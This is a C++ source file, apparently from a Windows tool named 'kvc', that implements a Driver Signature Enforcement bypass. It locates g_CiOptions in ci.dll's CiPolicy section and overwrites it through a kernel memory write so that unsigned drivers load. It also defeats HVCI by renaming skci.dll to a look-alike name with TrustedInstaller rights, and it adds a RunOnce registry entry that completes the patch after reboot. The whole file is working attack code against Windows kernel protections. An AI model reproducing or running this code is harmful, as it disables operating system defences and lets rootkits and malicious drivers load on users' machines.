#include "DSEBypass.h"
#include "TrustedInstallerIntegrator.h"
#include "common.h"

#pragma comment(lib, "ntdll.lib")

// Kernel module structures
typedef struct _SYSTEM_MODULE {
    ULONG_PTR Reserved1;
    ULONG_PTR Reserved2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR ImageName[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

DSEBypass::DSEBypass(std::unique_ptr<kvc>& rtc, TrustedInstallerIntegrator* trustedInstaller) 
    : m_rtc(rtc), m_trustedInstaller(trustedInstaller) {}

bool DSEBypass::DisableDSE() noexcept {
    DEBUG(L"Attempting to disable Driver Signature Enforcement...");
    
    // Find ci.dll kernel module base address
    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        return false;
    }
    
    DEBUG(L"ci.dll base: 0x%llX", ciBase.value());
    
    // Locate g_CiOptions variable in CiPolicy section
    m_ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!m_ciOptionsAddr) {
        ERROR(L"Failed to locate g_CiOptions");
        return false;
    }
    
    DEBUG(L"g_CiOptions address: 0x%llX", m_ciOptionsAddr);
    
    // Read current DSE value from kernel memory
    auto current = m_rtc->Read32(m_ciOptionsAddr);
    if (!current) {
        ERROR(L"Failed to read g_CiOptions");
        return false;
    }
    
    DWORD currentValue = current.value();
    m_originalValue = currentValue;
    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
    
    // Check if DSE is already disabled
    if (currentValue == 0x00000000) {
        INFO(L"DSE already disabled - no action required");
        SUCCESS(L"Kernel accepts unsigned drivers");
        return true;
    }

    // HVCI bypass is handled in Controller::DisableDSE() before calling this function
    // This function only handles standard DSE patching
    
    // Verify we have patchable DSE value (0x00000006)
    if (currentValue != 0x00000006) {
        INFO(L"Unexpected g_CiOptions value: 0x%08X", currentValue);
        INFO(L"Expected: 0x00000006 (patchable DSE)");
        INFO(L"DSE may already be disabled or system in non-standard configuration");
        INFO(L"Use 'kvc dse' to verify current state");
        return false;
    }
    
    // Disable DSE by clearing bits 1 and 2
    DWORD newValue = 0x00000000;
    
    if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
        ERROR(L"Failed to write g_CiOptions");
        return false;
    }
    
    // Verify the modification was successful
    auto verify = m_rtc->Read32(m_ciOptionsAddr);
    if (!verify || verify.value() != newValue) {
        ERROR(L"Verification failed (expected: 0x%08X, got: 0x%08X)", 
              newValue, verify ? verify.value() : 0xFFFFFFFF);
        return false;
    }
    
    SUCCESS(L"DSE disabled successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
    INFO(L"No restart required - unsigned drivers can now be loaded");
    return true;
}

bool DSEBypass::RestoreDSE() noexcept {
    DEBUG(L"Attempting to restore Driver Signature Enforcement...");
    
    // Step 1: Find ci.dll base address
    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        return false;
    }
    
    // Step 2: Locate g_CiOptions
    m_ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!m_ciOptionsAddr) {
        ERROR(L"Failed to locate g_CiOptions");
        return false;
    }
    
    DEBUG(L"g_CiOptions address: 0x%llX", m_ciOptionsAddr);
    
    // Step 3: Read current value
    auto current = m_rtc->Read32(m_ciOptionsAddr);
    if (!current) {
        ERROR(L"Failed to read g_CiOptions");
        return false;
    }
    
    DWORD currentValue = current.value();
    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
    
    // Step 4: Verify DSE is disabled (0x00000000)
    if (currentValue != 0x00000000) {
        INFO(L"DSE restore failed: g_CiOptions = 0x%08X (expected: 0x00000000)", currentValue);
        INFO(L"DSE may already be enabled or system in unexpected state");
        INFO(L"Use 'kvc dse' to check current protection status");
        return false;
    }
    
    // Step 5: Restore DSE bits
    DWORD newValue = 0x00000006;
    
    if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
        ERROR(L"Failed to write g_CiOptions");
        return false;
    }
    
    // Step 6: Verify the change
    auto verify = m_rtc->Read32(m_ciOptionsAddr);
    if (!verify || verify.value() != newValue) {
        ERROR(L"Verification failed (expected: 0x%08X, got: 0x%08X)", 
              newValue, verify ? verify.value() : 0xFFFFFFFF);
        return false;
    }
    
    SUCCESS(L"DSE restored successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
    INFO(L"No restart required - kernel protection reactivated");
    return true;
}

std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) noexcept {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        ERROR(L"Failed to get ntdll.dll handle");
        return std::nullopt;
    }

    typedef NTSTATUS (WINAPI *NTQUERYSYSTEMINFORMATION)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );

    auto pNtQuerySystemInformation = reinterpret_cast<NTQUERYSYSTEMINFORMATION>(
        GetProcAddress(hNtdll, "NtQuerySystemInformation"));
    
    if (!pNtQuerySystemInformation) {
        ERROR(L"Failed to get NtQuerySystemInformation");
        return std::nullopt;
    }

    // First call to get required buffer size
    ULONG bufferSize = 0;
    NTSTATUS status = pNtQuerySystemInformation(
        11, // SystemModuleInformation
        nullptr, 
        0, 
        &bufferSize
    );

    if (status != 0xC0000004L) { // STATUS_INFO_LENGTH_MISMATCH
        ERROR(L"NtQuerySystemInformation failed with status: 0x%08X", status);
        return std::nullopt;
    }

    // Allocate buffer and get module list
    auto buffer = std::make_unique<BYTE[]>(bufferSize);
    auto modules = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.get());
    
    status = pNtQuerySystemInformation(
        11, // SystemModuleInformation
        modules,
        bufferSize,
        &bufferSize
    );

    if (status != 0) {
        ERROR(L"NtQuerySystemInformation failed (2nd call): 0x%08X", status);
        return std::nullopt;
    }

    // Search for target module by name
    for (ULONG i = 0; i < modules->Count; i++) {
        auto& mod = modules->Modules[i];
        
        // Extract filename from full path
        const char* fileName = strrchr(mod.ImageName, '\\');
        if (fileName) {
            fileName++; // Skip backslash
        } else {
            fileName = mod.ImageName;
        }
        
        if (_stricmp(fileName, moduleName) == 0) {
            ULONG_PTR baseAddr = reinterpret_cast<ULONG_PTR>(mod.ImageBase);
            
            if (baseAddr == 0) {
                ERROR(L"Module %S found but ImageBase is NULL", moduleName);
                continue;
            }
            
            DEBUG(L"Found %S at 0x%llX (size: 0x%X)", moduleName, baseAddr, mod.ImageSize);
            return baseAddr;
        }
    }
    
    ERROR(L"Module %S not found in kernel", moduleName);
    return std::nullopt;
}

ULONG_PTR DSEBypass::FindCiOptions(ULONG_PTR ciBase) noexcept {
    DEBUG(L"Searching for g_CiOptions in ci.dll at base 0x%llX", ciBase);
    
    // Get CiPolicy section information
    auto dataSection = GetDataSection(ciBase);
    if (!dataSection) {
        ERROR(L"Failed to locate CiPolicy section in ci.dll");
        return 0;
    }
    
    ULONG_PTR dataStart = dataSection->first;
    SIZE_T dataSize = dataSection->second;
    
    DEBUG(L"CiPolicy section: 0x%llX (size: 0x%llX)", dataStart, dataSize);
    
    // g_CiOptions is always at offset +4 in CiPolicy section
    ULONG_PTR ciOptionsAddr = dataStart + 0x4;
    
    // Verify we can read from this address
    auto currentValue = m_rtc->Read32(ciOptionsAddr);
    if (!currentValue) {
        ERROR(L"Failed to read g_CiOptions at 0x%llX", ciOptionsAddr);
        return 0;
    }
    
    DEBUG(L"Found g_CiOptions at: 0x%llX (value: 0x%08X)", ciOptionsAddr, currentValue.value());
    return ciOptionsAddr;
}

std::optional<std::pair<ULONG_PTR, SIZE_T>> DSEBypass::GetDataSection(ULONG_PTR moduleBase) noexcept {
    // Read DOS header (MZ signature)
    auto dosHeader = m_rtc->Read16(moduleBase);
    if (!dosHeader || dosHeader.value() != 0x5A4D) {
        return std::nullopt;
    }
    
    // Get PE header offset
    auto e_lfanew = m_rtc->Read32(moduleBase + 0x3C);
    if (!e_lfanew || e_lfanew.value() > 0x1000) {
        return std::nullopt;
    }
    
    ULONG_PTR ntHeaders = moduleBase + e_lfanew.value();
    
    // Verify PE signature
    auto peSignature = m_rtc->Read32(ntHeaders);
    if (!peSignature || peSignature.value() != 0x4550) {
        return std::nullopt;
    }
    
    // Get section count
    auto numSections = m_rtc->Read16(ntHeaders + 0x6);
    if (!numSections || numSections.value() > 50) {
        return std::nullopt;
    }
    
    auto sizeOfOptionalHeader = m_rtc->Read16(ntHeaders + 0x14);
    if (!sizeOfOptionalHeader) return std::nullopt;
    
    ULONG_PTR firstSection = ntHeaders + 4 + 20 + sizeOfOptionalHeader.value();
    
    DEBUG(L"Scanning %d sections for CiPolicy...", numSections.value());
    
    // Search for CiPolicy section
    for (WORD i = 0; i < numSections.value(); i++) {
        ULONG_PTR sectionHeader = firstSection + (i * 40);
        
        // Read section name (8 bytes)
        char name[9] = {0};
        for (int j = 0; j < 8; j++) {
            auto ch = m_rtc->Read8(sectionHeader + j);
            if (ch) name[j] = static_cast<char>(ch.value());
        }
        
        // Check if this is CiPolicy
        if (strcmp(name, "CiPolicy") == 0) {
            auto virtualSize = m_rtc->Read32(sectionHeader + 0x08);
            auto virtualAddr = m_rtc->Read32(sectionHeader + 0x0C);
            
            if (virtualSize && virtualAddr) {
                DEBUG(L"Found CiPolicy section at RVA 0x%06X, size 0x%06X", 
                     virtualAddr.value(), virtualSize.value());
                
                return std::make_pair(
                    moduleBase + virtualAddr.value(),
                    static_cast<SIZE_T>(virtualSize.value())
                );
            }
        }
    }
    
    ERROR(L"CiPolicy section not found in ci.dll");
    return std::nullopt;
}

// ============================================================================
// HVCI BYPASS IMPLEMENTATION
// ============================================================================

bool DSEBypass::RenameSkciLibrary() noexcept {
    DEBUG(L"Attempting to rename skci.dll to disable hypervisor");
    
    if (!m_trustedInstaller) {
        ERROR(L"TrustedInstaller not available");
        return false;
    }
    
    wchar_t sysDir[MAX_PATH];
    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
        ERROR(L"Failed to get System32 directory");
        return false;
    }
    
    std::wstring srcPath = std::wstring(sysDir) + L"\\skci.dll";
    std::wstring dstPath = std::wstring(sysDir) + L"\\skci.dlI";  // uppercase I
    
    DEBUG(L"Rename: %s -> %s", srcPath.c_str(), dstPath.c_str());
    
    if (!m_trustedInstaller->RenameFileAsTrustedInstaller(srcPath, dstPath)) {
        ERROR(L"Failed to rename skci.dll (TrustedInstaller operation failed)");
        return false;
    }
    
    SUCCESS(L"skci.dll renamed successfully - hypervisor will not load on next boot");
    return true;
}

bool DSEBypass::RestoreSkciLibrary() noexcept {
    DEBUG(L"Restoring skci.dll from skci.dlI");
    
    wchar_t sysDir[MAX_PATH];
    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
        ERROR(L"Failed to get System32 directory");
        return false;
    }
    
    std::wstring srcPath = std::wstring(sysDir) + L"\\skci.dlI";
    std::wstring dstPath = std::wstring(sysDir) + L"\\skci.dll";
    
    // Admin rights sufficient for restore (no hypervisor running)
    DWORD attrs = GetFileAttributesW(srcPath.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(srcPath.c_str(), FILE_ATTRIBUTE_NORMAL);
    }
    
    if (!MoveFileW(srcPath.c_str(), dstPath.c_str())) {
        DWORD error = GetLastError();
        ERROR(L"Failed to restore skci.dll (error: %d)", error);
        return false;
    }
    
    SUCCESS(L"skci.dll restored successfully");
    return true;
}

bool DSEBypass::CreateRunOnceEntry() noexcept {
    DEBUG(L"Creating RunOnce registry entry");
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
                      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                      0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        ERROR(L"Failed to open RunOnce key");
        return false;
    }
    
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    
    std::wstring cmdLine = std::wstring(sysDir) + L"\\kvc.exe dse off";
    
    LONG result = RegSetValueExW(hKey, L"DisableDSE", 0, REG_SZ,
                                 reinterpret_cast<const BYTE*>(cmdLine.c_str()),
                                 static_cast<DWORD>((cmdLine.length() + 1) * sizeof(wchar_t)));
    
    RegCloseKey(hKey);
    
    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to set RunOnce value (error: %d)", result);
        return false;
    }
    
    DEBUG(L"RunOnce entry created: %s", cmdLine.c_str());
    return true;
}

bool DSEBypass::SaveDSEState(DWORD originalValue) noexcept {
    DEBUG(L"Saving state to registry");
    
    HKEY hKey;
    DWORD disposition;
    
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Kvc\\DSE", 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, 
                        &hKey, &disposition) != ERROR_SUCCESS) {
        ERROR(L"Failed to create registry key");
        return false;
    }
    
    std::wstring state = L"AwaitingRestore";
    RegSetValueExW(hKey, L"State", 0, REG_SZ,
                   reinterpret_cast<const BYTE*>(state.c_str()),
                   static_cast<DWORD>((state.length() + 1) * sizeof(wchar_t)));
    
    RegSetValueExW(hKey, L"OriginalValue", 0, REG_DWORD,
                   reinterpret_cast<const BYTE*>(&originalValue), sizeof(DWORD));
    
    RegCloseKey(hKey);
    
    DEBUG(L"State saved: AwaitingRestore, original: 0x%08X", originalValue);
    return true;
}

bool DSEBypass::LoadDSEState(std::wstring& outState, DWORD& outOriginalValue) noexcept {
    HKEY hKey;
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Kvc\\DSE", 0, 
                      KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    
    wchar_t state[256] = {0};
    DWORD size = sizeof(state);
    
    if (RegQueryValueExW(hKey, L"State", NULL, NULL, 
                         reinterpret_cast<BYTE*>(state), &size) == ERROR_SUCCESS) {
        outState = state;
    }
    
    size = sizeof(DWORD);
    RegQueryValueExW(hKey, L"OriginalValue", NULL, NULL,
                     reinterpret_cast<BYTE*>(&outOriginalValue), &size);
    
    RegCloseKey(hKey);
    return true;
}

bool DSEBypass::ClearDSEState() noexcept {
    DEBUG(L"Clearing state from registry");
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Kvc", 0, 
                      KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    
    RegDeleteTreeW(hKey, L"DSE");
    RegCloseKey(hKey);
    
    DEBUG(L"State cleared");
    return true;
}

bool DSEBypass::DisableDSEAfterReboot() noexcept {
    DEBUG(L"Post-reboot DSE disable sequence");
    
    std::wstring state;
    DWORD originalValue;
    
    if (!LoadDSEState(state, originalValue)) {
        ERROR(L"No pending DSE state found in registry");
        return false;
    }
    
    if (state != L"AwaitingRestore") {
        ERROR(L"Invalid state: %s", state.c_str());
        return false;
    }
    
    INFO(L"Found pending DSE bypass (original value: 0x%08X)", originalValue);
    
    // Step 1: Restore skci.dll
    if (!RestoreSkciLibrary()) {
        ERROR(L"Failed to restore skci.dll");
        return false;
    }
    
    // Step 2: Now patch g_CiOptions (HVCI no longer protects memory)
    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        return false;
    }
    
    m_ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!m_ciOptionsAddr) {
        ERROR(L"Failed to locate g_CiOptions");
        return false;
    }
    
    auto current = m_rtc->Read32(m_ciOptionsAddr);
    if (!current) {
        ERROR(L"Failed to read g_CiOptions");
        return false;
    }
    
    DWORD currentValue = current.value();
    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
    
    // Patch to 0x00000000
    DWORD newValue = 0x00000000;
    
    if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
        ERROR(L"Failed to write g_CiOptions");
        return false;
    }
    
    auto verify = m_rtc->Read32(m_ciOptionsAddr);
    if (!verify || verify.value() != newValue) {
        ERROR(L"Verification failed (expected: 0x%08X, got: 0x%08X)",
              newValue, verify ? verify.value() : 0xFFFFFFFF);
        return false;
    }
    
    // Step 3: Cleanup
    ClearDSEState();
    
    SUCCESS(L"DSE disabled successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
    SUCCESS(L"Hypervisor bypassed and skci.dll restored");
    
    return true;
}